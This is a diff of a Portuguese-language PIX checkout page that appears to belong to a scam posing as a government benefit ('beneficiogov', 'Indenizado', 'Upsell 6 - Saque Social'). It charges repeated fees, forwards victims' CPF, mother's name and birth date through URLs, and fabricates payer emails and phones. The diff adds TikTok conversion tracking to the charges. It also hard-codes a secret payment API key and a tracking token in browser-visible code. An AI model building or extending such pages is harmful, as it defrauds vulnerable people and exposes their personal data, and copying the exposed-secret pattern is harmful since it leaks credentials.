@@ -6,27 +6,17 @@
   w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
 var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
 ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
-
-  ttq.load('D6VJ0Q3C77UCSLHQUES0');
+  ttq.load('D6ROQ3BC77UA8MCFBSDG');
   ttq.page();
 }(window, document, 'ttq');
 </script>
 <!-- TikTok Pixel Code End -->
 
-  <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-  <script>
-  window.tikTokPixelId = "69bf318fad492d03fb01695e";
+<script>
+  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
   var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  a.setAttribute("async",""); a.setAttribute("defer","");
+  a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
   document.head.appendChild(a);
 </script>
 
@@ -191,328 +181,359 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 <script src="js/main.js"></script>
 <script>
 // =====================================================
-// CONFIGURAÇÃO — PARADISE PAGS
-// =====================================================
-var PARADISE_API_KEY  = 'sk_ab34b5dbce3ccce3e33070e6dcab26344a4c67b88706d5164ec01fb08eeaabac'; // ← cole sua sk_ aqui
-var PARADISE_ENDPOINT = 'https://multi.paradisepags.com';
+    // CONFIGURAÇÃO — PARADISE PAGS
+    // =====================================================
+    var PARADISE_API_KEY  = 'sk_ab34b5dbce3ccce3e33070e6dcab26344a4c67b88706d5164ec01fb08eeaabac';
+    var PARADISE_ENDPOINT = 'https://multi.paradisepags.com';
 
-var redirectUrls = {
-    6187: 'https://beneficiogov.vercel.app/obrigado.html',
-    3582: 'https://beneficiogov.vercel.app/obrigado.html',
-    2790: 'https://beneficiogov.vercel.app/obrigado.html',
-    1320: 'https://beneficiogov.vercel.app/obrigado.html',
-    8500: 'https://beneficiogov.vercel.app/obrigado.html',
-    4560: 'https://beneficiogov.vercel.app/obrigado.html',
-    1825: 'https://beneficiogov.vercel.app/obrigado.html',
-    100:  'https://beneficiogov.vercel.app/obrigado.html'
-};
-var DEFAULT_REDIRECT = 'https://beneficiogov.vercel.app/obrigado.html';
-// =====================================================
+    // Utmify: Paradise chama esta URL ao aprovar → venda registrada nas campanhas
+    var UTMIFY_POSTBACK_URL = 'https://api.utmify.com.br/api-credentials/orders?platform=other&token=ghRVhTRxLXJKyhUjsCV8fCTO903rL7JaRobk';
 
-var _txid          = null;   // transaction_id numérico da Paradise
-var _pixCode       = '';
-var _pixQrCode     = '';
-var _pollingTimer  = null;
-var _expiryTimer   = null;
-var _paymentAmount = 4560;
-var _customerData  = {};
-var STORAGE_KEY    = 'paradise_pix_tx5'; // chave única — não conflita com os outros checkouts
+    // ⚠️ OBRIGATÓRIO: hash do produto cadastrado no painel da Paradise
+    // Paradise → Produtos → clique no produto → copie o "Hash do Produto"
+    var PARADISE_PRODUCT_HASH = 'prod_2a4957d43af8f54d';
 
-function getP(key) {
-    var p = new URLSearchParams(window.location.search);
-    return p.get(key) || '';
-}
-function formatCPF(c) {
-    return (c||'').replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
-}
-function fmtBRL(cents) {
-    return (cents/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
-}
-function randomEmail(cpf) {
-    var s = (cpf||'').replace(/\D/g,'').slice(-8);
-    return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com';
-}
-function randomPhone() {
-    var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
-    return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
-}
-function gerarReference() {
-    return 'GOV-'+Date.now()+'-'+Math.floor(Math.random()*9999);
-}
-
-function saveTx(data) { try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e){} }
-function loadTx() {
-    try {
-        var s = localStorage.getItem(STORAGE_KEY);
-        if (!s) return null;
-        var d = JSON.parse(s);
-        if (d.expiry && Date.now() > d.expiry) { localStorage.removeItem(STORAGE_KEY); return null; }
-        return d;
-    } catch(e){ return null; }
-}
-function clearTx() { try { localStorage.removeItem(STORAGE_KEY); } catch(e){} }
-
-function showLoading(yes) { document.getElementById('loadingContainer').style.display = yes ? 'block' : 'none'; }
-function showError(msg) {
-    var ec = document.getElementById('errorContainer');
-    ec.classList.remove('hidden');
-    document.getElementById('errorText').textContent = msg;
-    showLoading(false);
-}
-function showPix() {
-    document.getElementById('pixContainer').classList.add('active');
-    showLoading(false);
-    document.getElementById('errorContainer').classList.add('hidden');
-}
-function setStatus(type, html) {
-    var el = document.getElementById('statusContainer');
-    el.className = 'status-container ' + type;
-    el.style.display = 'block';
-    el.innerHTML = html;
-}
-
-function displayQRCode(data) {
-    var el = document.getElementById('qrcode');
-    el.innerHTML = '';
-    if (!data) return;
-    if (data.startsWith('data:image')) {
-        var img = document.createElement('img');
-        img.src = data; img.alt = 'QR Code PIX';
-        img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
-        el.appendChild(img); return;
-    }
-    var img2 = document.createElement('img');
-    img2.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(data);
-    img2.alt = 'QR Code PIX';
-    img2.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
-    el.appendChild(img2);
-}
-
-function startExpiryTimer(expiry) {
-    if (_expiryTimer) clearInterval(_expiryTimer);
-    var timerEl = document.getElementById('expirationTimer');
-    var valueEl = document.getElementById('timerValue');
-    if (!timerEl || !valueEl) return;
-    timerEl.style.display = 'block';
-    function tick() {
-        var rem = expiry - Date.now();
-        if (rem <= 0) { valueEl.textContent = '00:00'; clearInterval(_expiryTimer); clearTx(); return; }
-        var m = Math.floor(rem/60000), s = Math.floor((rem%60000)/1000);
-        valueEl.textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
-        if (rem < 120000) { timerEl.style.background = '#fef2f2'; timerEl.style.borderColor = '#dc2626'; }
-    }
-    tick();
-    _expiryTimer = setInterval(tick, 1000);
-}
-
-var _currentMethod = 'copy';
-function togglePaymentMethod(method) {
-    var btn  = document.getElementById('togglePaymentMethod');
-    var copy = document.getElementById('pixCodeContainer');
-    var qrc  = document.getElementById('qrCodeContainer');
-    _currentMethod = method || (_currentMethod === 'copy' ? 'qrcode' : 'copy');
-    if (_currentMethod === 'copy') {
-        qrc.classList.remove('active'); copy.style.display = 'block';
-        if (btn) btn.textContent = '📱 Mudar para QR Code';
-    } else {
-        qrc.classList.add('active'); copy.style.display = 'none';
-        if (btn) btn.textContent = '📋 Mudar para Copia e Cola';
-    }
-}
-
-function toggleInstructions() {
-    document.getElementById('instructionsContent').classList.toggle('expanded');
-    document.getElementById('instructionsToggle').classList.toggle('expanded');
-}
-
-async function copyPixCode() {
-    if (!_pixCode) return;
-    try { await navigator.clipboard.writeText(_pixCode); } catch(e) {
-        var el = document.createElement('textarea');
-        el.value = _pixCode; el.style.cssText='position:fixed;opacity:0;';
-        document.body.appendChild(el); el.focus(); el.select();
-        try { document.execCommand('copy'); } catch(ee){} document.body.removeChild(el);
-    }
-    var btn = document.getElementById('copyButton'), orig = btn.textContent;
-    btn.textContent = '✓ Código copiado!'; btn.classList.add('copied');
-    setTimeout(function(){ btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
-}
-
-function updateDiscountBadge() {
-    var badge = document.getElementById('discountBadge');
-    if (!badge) return;
-    if (_paymentAmount < 3582) {
-        badge.textContent = 'Você ganhou ' + Math.round((3582-_paymentAmount)/3582*100) + '% de desconto!';
-        badge.classList.add('show');
-    } else { badge.classList.remove('show'); }
-}
-
-function renderPix() {
-    document.getElementById('amountValue').textContent = fmtBRL(_paymentAmount);
-    updateDiscountBadge();
-    if (_customerData.nome && _customerData.documento) {
-        document.getElementById('payerName').textContent = 'Indenizado: ' + _customerData.nome;
-        document.getElementById('payerDocument').textContent = 'CPF: ' + formatCPF(_customerData.documento);
-        document.getElementById('payerInfo').style.display = 'block';
-    }
-    document.getElementById('pixCode').textContent = _pixCode;
-    displayQRCode(_pixQrCode || _pixCode);
-    togglePaymentMethod('copy');
-    showPix();
-}
-
-// =====================================================
-// REDIRECIONA APÓS APROVAÇÃO — REPASSA TODOS OS PARAMS
-// =====================================================
-function redirectAfterPayment() {
-    var base = redirectUrls[_paymentAmount] || DEFAULT_REDIRECT;
-    var url  = new URL(base);
-    var cur  = new URLSearchParams(window.location.search);
-    // Repassa TUDO: nome, cpf, mae, nascimento, utms, etc.
-    cur.forEach(function(value, key) { url.searchParams.set(key, value); });
-    console.log('Redirecionando para:', url.toString());
-    setTimeout(function(){ window.location.href = url.toString(); }, 2000);
-}
-
-// =====================================================
-// POLLING — PARADISE PAGS
-// GET /api/v1/query.php?action=get_transaction&id={transaction_id}
-// Status aprovado: "approved"
-// =====================================================
-function startPolling() {
-    if (!_txid) return;
-    console.log('Polling Paradise para transaction_id:', _txid);
-    var attempts = 0;
-    _pollingTimer = setInterval(async function() {
-        attempts++;
-        if (attempts > 180) { clearInterval(_pollingTimer); return; }
-        try {
-            var r = await fetch(
-                PARADISE_ENDPOINT + '/api/v1/query.php?action=get_transaction&id=' + _txid,
-                { headers: { 'X-API-Key': PARADISE_API_KEY } }
-            );
-            var s = await r.json();
-            console.log('Polling tentativa ' + attempts + ':', s.status);
-
-            if (s.status === 'approved') {
-                clearInterval(_pollingTimer);
-                clearTx();
-                setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
-                redirectAfterPayment();
-            } else if (['failed','refunded','chargeback'].includes(s.status)) {
-                clearInterval(_pollingTimer);
-                clearTx();
-                setStatus('error', '<div class="status-icon">❌</div><div class="status-text">Pagamento cancelado ou expirado.</div>');
-            }
-        } catch(e) { console.error('Polling erro:', e); }
-    }, 5000);
-}
-
-// =====================================================
-// CRIA PIX — PARADISE PAGS
-// POST /api/v1/transaction.php  |  Auth: X-API-Key
-// =====================================================
-async function createPix() {
-    var nome     = getP('nome') || getP('name') || '';
-    var cpf      = (getP('documento') || getP('cpf')).replace(/\D/g,'');
-    var email    = getP('email') || randomEmail(cpf);
-    var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
-    var valorRaw = getP('valor');
-    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 3582;
-    if (isNaN(valor) || valor <= 0) valor = 3582;
-
-    var nomeEnvio = nome.trim();
-    if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
-
-    _paymentAmount = valor;
-    _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
-
-    var payload = {
-        amount:      valor,
-        description: 'Pagamento Aprovado.',
-        reference:   gerarReference(),
-        source:      'api_externa',
-        customer: {
-            name:     nomeEnvio,
-            email:    email,
-            phone:    telefone,
-            document: cpf
-        },
-        tracking: {
-            utm_source:   getP('utm_source'),
-            utm_medium:   getP('utm_medium'),
-            utm_campaign: getP('utm_campaign'),
-            utm_content:  getP('utm_content'),
-            utm_term:     getP('utm_term'),
-            src:          getP('src'),
-            sck:          getP('sck')
-        }
+    var redirectUrls = {
+        6187: 'https://beneficiogov.vercel.app/obrigado.html',
+        3582: 'https://beneficiogov.vercel.app/obrigado.html',
+        2790: 'https://beneficiogov.vercel.app/obrigado.html',
+        1320: 'https://beneficiogov.vercel.app/obrigado.html',
+        8500: 'https://beneficiogov.vercel.app/obrigado.html',
+        4560: 'https://beneficiogov.vercel.app/obrigado.html',
+        1825: 'https://beneficiogov.vercel.app/obrigado.html',
+        100:  'https://beneficiogov.vercel.app/obrigado.html'
     };
-    console.log('Paradise payload:', JSON.stringify(payload));
+    var DEFAULT_REDIRECT = 'https://beneficiogov.vercel.app/obrigado.html';
+    // =====================================================
 
-    var res = await fetch(PARADISE_ENDPOINT + '/api/v1/transaction.php', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json', 'X-API-Key': PARADISE_API_KEY },
-        body:    JSON.stringify(payload)
+    var _txid          = null;   // transaction_id numérico da Paradise
+    var _pixCode       = '';
+    var _pixQrCode     = '';
+    var _pollingTimer  = null;
+    var _expiryTimer   = null;
+    var _paymentAmount = 4560;
+    var _customerData  = {};
+    var STORAGE_KEY    = 'paradise_pix_tx5';
+
+    function getP(key) {
+        var p = new URLSearchParams(window.location.search);
+        return p.get(key) || '';
+    }
+    function formatCPF(c) {
+        return (c||'').replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+    }
+    function fmtBRL(cents) {
+        return (cents/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
+    }
+    function randomEmail(cpf) {
+        var s = (cpf||'').replace(/\D/g,'').slice(-8);
+        return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com';
+    }
+    function randomPhone() {
+        var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
+        return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
+    }
+    function gerarReference() {
+        return 'GOV-'+Date.now()+'-'+Math.floor(Math.random()*9999);
+    }
+
+    function saveTx(data) { try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e){} }
+    function loadTx() {
+        try {
+            var s = localStorage.getItem(STORAGE_KEY);
+            if (!s) return null;
+            var d = JSON.parse(s);
+            if (d.expiry && Date.now() > d.expiry) { localStorage.removeItem(STORAGE_KEY); return null; }
+            return d;
+        } catch(e){ return null; }
+    }
+    function clearTx() { try { localStorage.removeItem(STORAGE_KEY); } catch(e){} }
+
+    function showLoading(yes) { document.getElementById('loadingContainer').style.display = yes ? 'block' : 'none'; }
+    function showError(msg) {
+        var ec = document.getElementById('errorContainer');
+        ec.classList.remove('hidden');
+        document.getElementById('errorText').textContent = msg;
+        showLoading(false);
+    }
+    function showPix() {
+        document.getElementById('pixContainer').classList.add('active');
+        showLoading(false);
+        document.getElementById('errorContainer').classList.add('hidden');
+    }
+    function setStatus(type, html) {
+        var el = document.getElementById('statusContainer');
+        el.className = 'status-container ' + type;
+        el.style.display = 'block';
+        el.innerHTML = html;
+    }
+
+    function displayQRCode(data) {
+        var el = document.getElementById('qrcode');
+        el.innerHTML = '';
+        if (!data) return;
+        if (data.startsWith('data:image')) {
+            var img = document.createElement('img');
+            img.src = data; img.alt = 'QR Code PIX';
+            img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
+            el.appendChild(img); return;
+        }
+        var img2 = document.createElement('img');
+        img2.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(data);
+        img2.alt = 'QR Code PIX';
+        img2.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
+        el.appendChild(img2);
+    }
+
+    function startExpiryTimer(expiry) {
+        if (_expiryTimer) clearInterval(_expiryTimer);
+        var timerEl = document.getElementById('expirationTimer');
+        var valueEl = document.getElementById('timerValue');
+        if (!timerEl || !valueEl) return;
+        timerEl.style.display = 'block';
+        function tick() {
+            var rem = expiry - Date.now();
+            if (rem <= 0) { valueEl.textContent = '00:00'; clearInterval(_expiryTimer); clearTx(); return; }
+            var m = Math.floor(rem/60000), s = Math.floor((rem%60000)/1000);
+            valueEl.textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+            if (rem < 120000) { timerEl.style.background = '#fef2f2'; timerEl.style.borderColor = '#dc2626'; }
+        }
+        tick();
+        _expiryTimer = setInterval(tick, 1000);
+    }
+
+    var _currentMethod = 'copy';
+    function togglePaymentMethod(method) {
+        var btn  = document.getElementById('togglePaymentMethod');
+        var copy = document.getElementById('pixCodeContainer');
+        var qrc  = document.getElementById('qrCodeContainer');
+        _currentMethod = method || (_currentMethod === 'copy' ? 'qrcode' : 'copy');
+        if (_currentMethod === 'copy') {
+            qrc.classList.remove('active'); copy.style.display = 'block';
+            if (btn) btn.textContent = '📱 Mudar para QR Code';
+        } else {
+            qrc.classList.add('active'); copy.style.display = 'none';
+            if (btn) btn.textContent = '📋 Mudar para Copia e Cola';
+        }
+    }
+
+    function toggleInstructions() {
+        document.getElementById('instructionsContent').classList.toggle('expanded');
+        document.getElementById('instructionsToggle').classList.toggle('expanded');
+    }
+
+    async function copyPixCode() {
+        if (!_pixCode) return;
+        try { await navigator.clipboard.writeText(_pixCode); } catch(e) {
+            var el = document.createElement('textarea');
+            el.value = _pixCode; el.style.cssText='position:fixed;opacity:0;';
+            document.body.appendChild(el); el.focus(); el.select();
+            try { document.execCommand('copy'); } catch(ee){} document.body.removeChild(el);
+        }
+        // ✅ TikTok AddPaymentInfo — usuário copiou o PIX (intenção forte de pagar)
+        try { ttq.track('AddPaymentInfo', { content_id: 'saque-social', content_type: 'product', currency: 'BRL', value: parseFloat((_paymentAmount/100).toFixed(2)), quantity: 1 }); } catch(e) {}
+        var btn = document.getElementById('copyButton'), orig = btn.textContent;
+        btn.textContent = '✓ Código copiado!'; btn.classList.add('copied');
+        setTimeout(function(){ btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
+    }
+
+    function updateDiscountBadge() {
+        var badge = document.getElementById('discountBadge');
+        if (!badge) return;
+        if (_paymentAmount < 4560) {
+            badge.textContent = 'Você ganhou ' + Math.round((4560-_paymentAmount)/4560*100) + '% de desconto!';
+            badge.classList.add('show');
+        } else { badge.classList.remove('show'); }
+    }
+
+    function renderPix() {
+        document.getElementById('amountValue').textContent = fmtBRL(_paymentAmount);
+        updateDiscountBadge();
+        if (_customerData.nome && _customerData.documento) {
+            document.getElementById('payerName').textContent = 'Indenizado: ' + _customerData.nome;
+            document.getElementById('payerDocument').textContent = 'CPF: ' + formatCPF(_customerData.documento);
+            document.getElementById('payerInfo').style.display = 'block';
+        }
+        document.getElementById('pixCode').textContent = _pixCode;
+        displayQRCode(_pixQrCode || _pixCode);
+        togglePaymentMethod('copy');
+        // ✅ TikTok ViewContent + InitiateCheckout ao exibir o PIX
+        try { ttq.track('ViewContent',       { content_id: 'saque-social', content_type: 'product', currency: 'BRL', value: parseFloat((_paymentAmount/100).toFixed(2)), quantity: 1 }); } catch(e) {}
+        try { ttq.track('InitiateCheckout',  { content_id: 'saque-social', content_type: 'product', currency: 'BRL', value: parseFloat((_paymentAmount/100).toFixed(2)), quantity: 1 }); } catch(e) {}
+        showPix();
+    }
+
+    // =====================================================
+    // REDIRECIONA APÓS APROVAÇÃO — REPASSA TODOS OS PARAMS
+    // =====================================================
+    function redirectAfterPayment() {
+        var base = redirectUrls[_paymentAmount] || DEFAULT_REDIRECT;
+        console.log('✅ PAGAMENTO APROVADO — redirecionando para:', base);
+        try {
+            var url = new URL(base);
+            var cur = new URLSearchParams(window.location.search);
+            // Repassa TUDO: nome, cpf, mae, nascimento, utms, etc.
+            cur.forEach(function(value, key) { url.searchParams.set(key, value); });
+            console.log('Redirect final:', url.toString());
+            window.location.href = url.toString();
+        } catch(e) {
+            window.location.href = base; // fallback
+        }
+    }
+
+    // =====================================================
+    // POLLING — PARADISE PAGS
+    // GET /api/v1/query.php?action=get_transaction&id={id}
+    // Status aprovado: "approved"
+    // =====================================================
+    function startPolling() {
+        if (!_txid) return;
+        console.log('Polling Paradise para transaction_id:', _txid);
+        var attempts = 0;
+        _pollingTimer = setInterval(async function() {
+            attempts++;
+            if (attempts > 180) { clearInterval(_pollingTimer); return; }
+            try {
+                var r = await fetch(
+                    PARADISE_ENDPOINT + '/api/v1/query.php?action=get_transaction&id=' + _txid,
+                    { headers: { 'X-API-Key': PARADISE_API_KEY } }
+                );
+                var s = await r.json();
+                console.log('Polling tentativa ' + attempts + ':', s.status);
+
+                if (s.status === 'approved') {
+                    clearInterval(_pollingTimer);
+                    clearTx();
+                    setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
+                    // ✅ TikTok Purchase com valor real + transaction_id (deduplicação)
+                    try {
+                        ttq.track('Purchase', {
+                            content_id:     'saque-social',
+                            content_type:   'product',
+                            currency:       'BRL',
+                            value:          parseFloat((_paymentAmount / 100).toFixed(2)),
+                            quantity:       1,
+                            transaction_id: String(s.id || _txid)
+                        });
+                        console.log('[TTQ] Purchase ✓ valor=R$' + (_paymentAmount/100).toFixed(2));
+                    } catch(e) {}
+                    // Aguarda 800ms para o evento ser enviado antes de redirecionar
+                    setTimeout(function(){ redirectAfterPayment(); }, 800);
+
+                } else if (['failed','refunded','chargeback'].includes(s.status)) {
+                    clearInterval(_pollingTimer);
+                    clearTx();
+                    setStatus('error', '<div class="status-icon">❌</div><div class="status-text">Pagamento cancelado ou expirado.</div>');
+                }
+            } catch(e) { console.error('Polling erro:', e); }
+        }, 5000);
+    }
+
+    // =====================================================
+    // CRIA PIX — PARADISE PAGS
+    // POST /api/v1/transaction.php  |  Auth: X-API-Key
+    // =====================================================
+    async function createPix() {
+        var nome     = getP('nome') || getP('name') || '';
+        var cpf      = (getP('documento') || getP('cpf')).replace(/\D/g,'');
+        var email    = getP('email') || randomEmail(cpf);
+        var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
+        var valorRaw = getP('valor');
+        var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 4560;
+        if (isNaN(valor) || valor <= 0) valor = 4560;
+
+        var nomeEnvio = nome.trim();
+        if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
+
+        _paymentAmount = valor;
+        _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
+
+        var payload = {
+            amount:       valor,
+            description:  'Upsell 6 - Saque Social',
+            reference:    gerarReference(),
+            productHash:  PARADISE_PRODUCT_HASH,   // obrigatório para Utmify
+            postback_url: UTMIFY_POSTBACK_URL,       // Paradise notifica Utmify ao aprovar
+            customer: {
+                name:     nomeEnvio,
+                email:    email,
+                phone:    telefone,
+                document: cpf
+            },
+            tracking: {
+                utm_source:   getP('utm_source'),
+                utm_medium:   getP('utm_medium'),
+                utm_campaign: getP('utm_campaign'),
+                utm_content:  getP('utm_content'),
+                utm_term:     getP('utm_term'),
+                src:          getP('src'),
+                sck:          getP('sck')
+            }
+        };
+        console.log('Paradise payload:', JSON.stringify(payload));
+
+        var res = await fetch(PARADISE_ENDPOINT + '/api/v1/transaction.php', {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json', 'X-API-Key': PARADISE_API_KEY },
+            body:    JSON.stringify(payload)
+        });
+        var data = await res.json();
+        console.log('Paradise resposta:', JSON.stringify(data));
+
+        if (!res.ok || data.status !== 'success') throw new Error('Erro ' + res.status + ': ' + JSON.stringify(data));
+        if (!data.qr_code) throw new Error('PIX não gerado: ' + JSON.stringify(data));
+
+        _txid      = data.transaction_id;   // ID numérico para polling
+        _pixCode   = data.qr_code;
+        _pixQrCode = data.qr_code_base64 || '';
+
+        saveTx({
+            txid: _txid, pixCode: _pixCode, pixQrCode: _pixQrCode,
+            amount: _paymentAmount, customer: _customerData,
+            expiry: Date.now() + 600000
+        });
+        return data;
+    }
+
+    // =====================================================
+    // INICIALIZAÇÃO
+    // =====================================================
+    async function initCheckout() {
+        var nome = getP('nome') || getP('name') || '';
+        var cpf  = getP('documento') || getP('cpf') || '';
+
+        if (!nome || !cpf) {
+            showError('Nome e CPF são obrigatórios na URL.');
+            return;
+        }
+
+        var saved = loadTx();
+        if (saved && saved.txid) {
+            console.log('Transação salva encontrada:', saved.txid);
+            _txid = saved.txid; _pixCode = saved.pixCode;
+            _pixQrCode = saved.pixQrCode; _paymentAmount = saved.amount;
+            _customerData = saved.customer || {};
+            renderPix();
+            startExpiryTimer(saved.expiry);
+            startPolling();
+            return;
+        }
+
+        showLoading(true);
+        try {
+            await createPix();
+            renderPix();
+            startExpiryTimer(Date.now() + 600000);
+            startPolling();
+        } catch(err) {
+            console.error('Erro ao criar PIX:', err);
+            showError('Não foi possível gerar o PIX. ' + (err.message || '') + ' Tente novamente.');
+        }
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+        initCheckout();
     });
-    var data = await res.json();
-    console.log('Paradise resposta:', JSON.stringify(data));
-
-    if (!res.ok || data.status !== 'success') throw new Error('Erro ' + res.status + ': ' + JSON.stringify(data));
-    if (!data.qr_code) throw new Error('PIX não gerado: ' + JSON.stringify(data));
-
-    _txid      = data.transaction_id; // ID numérico para polling
-    _pixCode   = data.qr_code;
-    _pixQrCode = data.qr_code_base64 || '';
-
-    saveTx({
-        txid: _txid, pixCode: _pixCode, pixQrCode: _pixQrCode,
-        amount: _paymentAmount, customer: _customerData,
-        expiry: Date.now() + 600000
-    });
-
-    return data;
-}
-
-// =====================================================
-// INICIALIZAÇÃO
-// =====================================================
-async function initCheckout() {
-    var nome = getP('nome') || getP('name') || '';
-    var cpf  = getP('documento') || getP('cpf') || '';
-
-    if (!nome || !cpf) {
-        showError('Nome e CPF são obrigatórios na URL. Exemplo: ?nome=João Silva&documento=12345678900');
-        return;
-    }
-
-    var saved = loadTx();
-    if (saved && saved.txid) {
-        console.log('Transação salva encontrada:', saved.txid);
-        _txid = saved.txid; _pixCode = saved.pixCode;
-        _pixQrCode = saved.pixQrCode; _paymentAmount = saved.amount;
-        _customerData = saved.customer || {};
-        renderPix();
-        startExpiryTimer(saved.expiry);
-        startPolling();
-        return;
-    }
-
-    showLoading(true);
-    try {
-        await createPix();
-        renderPix();
-        startExpiryTimer(Date.now() + 600000);
-        startPolling();
-    } catch(err) {
-        console.error('Erro ao criar PIX:', err);
-        showError('Não foi possível gerar o PIX. ' + (err.message || '') + ' Tente novamente.');
-    }
-}
-
-window.addEventListener('DOMContentLoaded', function() {
-    initCheckout();
-});
 </script>
 
 </body></html>
